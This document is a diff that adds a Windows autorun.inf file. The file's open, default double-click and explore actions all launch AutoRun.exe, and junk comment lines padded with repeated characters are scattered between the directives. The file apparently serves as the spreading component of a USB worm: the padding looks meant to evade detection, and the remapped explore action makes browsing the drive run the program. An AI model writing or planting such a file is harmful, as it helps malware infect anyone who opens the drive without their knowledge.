@@ -1,0 +1,13 @@
+;aaaaaaaaaaaaaaaaarunelslsautoelslsautoaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[AutoRun]
+;ffffffffffffffffrunelslsautoelslsautoffffffffffffffffffffffffffff
+open=AutoRun.exe
+;rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+;shell\open=Open(&O)
+shell\open\Command=AutoRun.exe
+;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+shell\open\Default=1
+;shell\explore=Manager(&X)
+;2222222222222222222runelslsautoelslsauto222222222222222222222222222222222222222222
+shell\explore\Command=AutoRun.exe
+;uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
